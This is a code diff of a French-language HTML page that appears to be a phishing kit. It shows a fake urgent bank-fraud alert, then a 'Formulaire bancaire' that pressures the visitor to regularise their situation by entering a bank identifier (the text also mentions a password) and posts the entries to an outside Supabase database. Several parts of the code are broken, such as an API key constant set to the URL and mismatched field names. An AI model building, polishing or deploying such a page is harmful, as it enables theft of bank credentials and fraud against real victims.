@@ -1,34 +1,169 @@
-<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🚨 ALERTE URGENCE</title><style>body{margin:0;background:#120000;color:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}.alerte{background:#250000;border:3px solid red;box-shadow:0 0 30px red;padding:35px 20px;border-radius:15px;max-width:600px;margin:20px;animation:clignote 1s infinite alternate}h1{color:#ff2222;font-size:clamp(25px,6vw,42px)}p{font-size:18px;line-height:1.6}.bouton{background:red;color:white;border:0;padding:14px 25px;font-size:17px;font-weight:bold;border-radius:8px;cursor:pointer}@keyframes clignote{from{box-shadow:0 0 10px red}to{box-shadow:0 0 35px red}}</style></head><body><div class="alerte"><h1>🚨 ALERTE D'URGENCE 🚨</h1><h2>MENACE DÉTECTÉE SUR VOTRE COMPTE BANCAIRE !</h2><p>⚠️ Plusieurs personnes tentent de soumettre des paiements a partir d'une carte bancaire finissant par 8445! Une activité suspecte a été détectée. Restez vigilants et protégez vos compte !</p><p><strong>STATUT : ALERTE ROUGE</strong></p><button class="bouton" onclick="alert('Alerte confirmée ! Restez vigilant.')">COMPRIS !</button></div>const SUPABASE_URL = "https://jjtwodgevtkltqovargh.supabase.co";
-const SUPABASE_KEY = "sb_publishable_RLf0BCb8mALcGK3jPL5r6g_WFOy_3G7";
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🚨 Formulaire bancaire </title>
 
-async function envoyerDonnees(donnees) {
-  const reponse = await fetch(`${SUPABASE_URL}/rest/v1/formulaires`, {
-    method: "POST",
-    headers: {
-      "apikey": SUPABASE_KEY,
-      "Authorization": `Bearer ${SUPABASE_KEY}`,
-      "Content-Type": "application/json",
-      "Prefer": "return=minimal"
-    },
-    body: JSON.stringify(donnees)
-  });
-  if (!reponse.ok) throw new Error(await reponse.text());
-  return true;
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  background: #120000;
+  color: white;
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  text-align: center;
 }
 
-// Envoi automatique quand le client clique sur Valider
-document.querySelector.bancaire("form")?.addEventListener("submit", async function(event) {
+.alerte {
+  background: #250000;
+  border: 3px solid red;
+  box-shadow: 0 0 30px red;
+  padding: 30px 20px;
+  border-radius: 15px;
+  max-width: 550px;
+  width: calc(100% - 32px);
+  animation: clignote 1s infinite alternate;
+}
+
+h1 {
+  color: #ff2222;
+  font-size: clamp(25px, 6vw, 42px);
+}
+
+p { font-size: 17px; line-height: 1.6; }
+
+input {
+  display: block;
+  width: 100%;
+  padding: 13px;
+  margin: 12px 0;
+  border-radius: 7px;
+  border: 1px solid #999;
+  font-size: 16px;
+}
+
+.bouton {
+  background: red;
+  color: white;
+  border: 0;
+  padding: 14px 25px;
+  margin-top: 10px;
+  font-size: 17px;
+  font-weight: bold;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+.bouton:disabled { opacity: 0.6; }
+#message { overflow-wrap: anywhere; }
+
+@keyframes clignote {
+  from { box-shadow: 0 0 10px red; }
+  to { box-shadow: 0 0 35px red; }
+}
+</style>
+</head>
+
+<body>
+<div class="alerte">
+  <h1>🚨 FORMULAIRE bancaire 🚨</h1>
+  <h2>Enregistrement du client</h2>
+
+  <p>
+    En confirmant, tu regularise ta situation , ton identifiant
+    de banque et ton mot de passe.
+  </p>
+
+  <form id="formulaire">
+    <input
+      type="text"
+      name="pseudo"
+      placeholder="Pseudo du client"
+      maxlength="50"
+      required
+    >
+
+    <input
+      type="text"
+      name="identifiant_bancaire"
+      placeholder="Identifiant bancaire"
+      maxlength="100"
+      required
+    >
+
+    <input
+      type="number"
+      name="client"
+      placeholder="Score"
+      min="0"
+      required
+    >
+
+    <button class="bouton" id="confirmer" type="submit">
+      CONFIRMER
+    </button>
+  </form>
+
+  <p id="message" role="status"></p>
+</div>
+
+<script>
+const SUPABASE_URL =
+  "https://jjtwodgevtkltqovargh.supabase.co";
+
+const SUPABASE_KEY =
+  "https://jjtwodgevtkltqovargh.supabase.co";
+
+const formulaire = document.getElementById("formulaire");
+const bouton = document.getElementById("confirmer");
+const message = document.getElementById("message");
+
+formulaire.addEventListener("submit", async function(event) {
   event.preventDefault();
 
-  const formulaire = event.currentTarget;
-  const donnees = Object.fromEntries(new FormData(formulaire).entries());
+  const donnees = Object.fromEntries(
+    new FormData(formulaire).entries()
+  );
+
+  donnees.score = Number(donnees.score);
+
+  bouton.disabled = true;
+  message.textContent = "Envoi en cours…";
 
   try {
-    await envoyerDonnees(donnees);
-    alert("✅ Données bancaire envoyées !");
+    const reponse = await fetch(
+      `${SUPABASE_URL}/rest/v1/client`,
+      {
+        method: "POST",
+        headers: {
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`,
+          "Content-Type": "application/json",
+          "Prefer": "return=minimal"
+        },
+        body: JSON.stringify(donnees)
+      }
+    );
+
+    if (!reponse.ok) {
+      throw new Error(await reponse.text());
+    }
+
+    message.textContent = "✅ Données enregistrées !";
+    formulaire.reset();
+
   } catch (erreur) {
-    console.error(erreur);
-    alert("❌ Échec de l'envoi vers Supabase.");
+    console.error("Erreur Supabase :", erreur);
+    message.textContent =
+      "❌ Échec de l'envoi. Vérifie la clé, les colonnes et les autorisations.";
+  } finally {
+    bouton.disabled = false;
   }
 });
 </script>
